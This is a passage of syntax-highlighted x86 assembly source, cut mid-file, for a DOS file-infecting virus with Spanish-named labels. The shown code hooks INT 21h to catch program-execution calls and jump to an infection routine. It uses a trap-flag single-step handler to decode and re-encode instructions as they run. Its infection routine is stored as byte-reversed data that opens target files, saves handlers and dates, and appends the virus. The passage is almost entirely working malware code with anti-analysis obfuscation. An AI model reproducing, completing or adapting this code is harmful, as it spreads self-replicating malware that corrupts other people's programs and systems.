                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">    </span><span class="sc1">; Conditional jnb jump check</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@jmp2aplace</span><span class="sc0">

</span><span class="sc5">@jjb</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">    </span><span class="sc1">; Conditional jb jump check</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@bytes2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@jmp2aplace</span><span class="sc0">

</span><span class="sc5">@jjnz</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">01000000b</span><span class="sc0">    </span><span class="sc1">; Conditional jnz jump check</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@jmp2aplace</span><span class="sc0">

</span><span class="sc5">@jjz</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">01000000b</span><span class="sc0">    </span><span class="sc1">; Are we going to make the jump jz ?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@bytes2</span><span class="sc0">         </span><span class="sc1">; If zero flag isn't on, we take it</span><span class="sc0">
                                        </span><span class="sc1">;as a normal 2 bytes instruction</span><span class="sc0">
</span><span class="sc5">@jmp2aplace</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hay_salto</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
                                        </span><span class="sc1">; To interpret well next instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; And we put the instruction offset</span><span class="sc0">
                                        </span><span class="sc1">;at [offsetjmp] to recode it on the</span><span class="sc0">
                                        </span><span class="sc1">;next pass</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">offset_jmp</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@bytes2</span><span class="sc0">         </span><span class="sc1">; Nothing to do now... let's leave</span><span class="sc0">
                                        </span><span class="sc1">;the jump execute and then we'll</span><span class="sc0">
                                        </span><span class="sc1">;do things ;)</span><span class="sc0">

</span><span class="sc5">@bytes5</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@bytes4</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@bytes3</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@bytes2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Cx has instruction lenght</span><span class="sc0">
</span><span class="sc5">@bytes1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">instanterior</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">instanterior</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; We place SI at the end of the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">;backwards instruction ( ok, at the</span><span class="sc0">
                                        </span><span class="sc1">;begin ;) )</span><span class="sc0">

</span><span class="sc5">@loop_guardar</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; We store each opcode in Al, on the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;stack</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@loop_guardar</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc5">@loop_reponer</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; We take from the stack all opcodes</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;and place them in a correct form</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@loop_reponer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20d</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">; And now we place Si, the</span><span class="sc0">
                                        </span><span class="sc1">;instruction we're executing next</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hay_salto</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@sec_loop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">offset_jmp</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hay_salto</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">@sec_loop</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; Now we're codyfing the just</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;executed instruction, "backwarding"</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@sec_loop</span><span class="sc0">       </span><span class="sc1">;it; it will be exactly as it was.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">@sec_store</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; So we store backwards</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@sec_store</span><span class="sc0">

</span><span class="sc5">vamonos</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hay_salto</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; Ok, this was the inst</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">vamos_ya</span><span class="sc0">                     </span><span class="sc1">;just before the jump,</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hay_salto</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;so it will be the next</span><span class="sc0">
                                                     </span><span class="sc1">;executing</span><span class="sc0">
</span><span class="sc5">vamos_ya</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_em_all</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hay_salto</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@return</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hay_salto</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0a9h</span><span class="sc0">                        </span><span class="sc1">; Int 21h</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">

</span><span class="sc5">@return</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                                        </span><span class="sc1">; Pop registers and go</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;                             FILE INFECTION</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">


        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f8h</span><span class="sc0">                </span><span class="sc1">; "End of infection" mark</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01fh</span><span class="sc4">,</span><span class="sc2">05ah</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc0">

                    </span><span class="sc1">; Restore int24h</span><span class="sc0">
</span><span class="sc5">@jmp3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03eh</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">058h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">059h</span><span class="sc0">

</span><span class="sc5">@close</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">salto</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">099h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c9h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
                    </span><span class="sc1">; Now to the init</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">tupac_ff</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">tupac_size</span><span class="sc4">-(</span><span class="sc5">tupac_ff</span><span class="sc4">*</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b9h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">

                </span><span class="sc1">; Attach to the end</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lugarsalto</span><span class="sc4">,</span><span class="sc2">0a3h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">02dh</span><span class="sc0">

</span><span class="sc5">@len</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">-((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@len</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@close</span><span class="sc4">)),</span><span class="sc2">073h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">099h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c9h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
</span><span class="sc5">@jjmp4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">-((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@jjmp4</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@close</span><span class="sc4">))</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">074h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">@jjmp5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">-((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@jjmp5</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@close</span><span class="sc4">))</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">074h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">03ch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01fh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eh</span><span class="sc0">

                    </span><span class="sc1">; Read first four bytes</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">051h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">052h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">050h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">

                    </span><span class="sc1">; Save the date</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03dh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">

</span><span class="sc5">@jmp1</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; Open file</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d9h</span><span class="sc4">,</span><span class="sc2">08eh</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">place_ff24</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">place_21</span><span class="sc4">-(</span><span class="sc5">place_ff24</span><span class="sc4">*</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01fh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">050h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">053h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">035h</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d9h</span><span class="sc4">,</span><span class="sc2">08ch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc0">

                        </span><span class="sc1">; Save the int 24h</span><span class="sc0">

</span><span class="sc5">start_infecting</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">nop</span><span class="sc0">                 </span><span class="sc1">; Infection start</span><span class="sc0">

            </span><span class="sc1">;**********************************</span><span class="sc0">
            </span><span class="sc1">;         INT 21H HANDLER</span><span class="sc0">
            </span><span class="sc1">;**********************************</span><span class="sc0">

</span><span class="sc5">in21</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">INT21HANDLER</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c0c0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">i_check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int21jump</span><span class="sc0">

</span><span class="sc5">i_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">bp_site</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_em_all</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">installing_on</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">init_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3501h</span><span class="sc0">        </span><span class="sc1">; Get int1h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int1h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int1h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">back_zone</span><span class="sc0">    </span><span class="sc1">; Redirect it to the zone that's</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2501h</span><span class="sc0">        </span><span class="sc1">;going to control backwards execution</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">; Trap flag = 1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">@continue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">start_infecting</span><span class="sc0">

</span><span class="sc5">int1h</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">bp_site</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

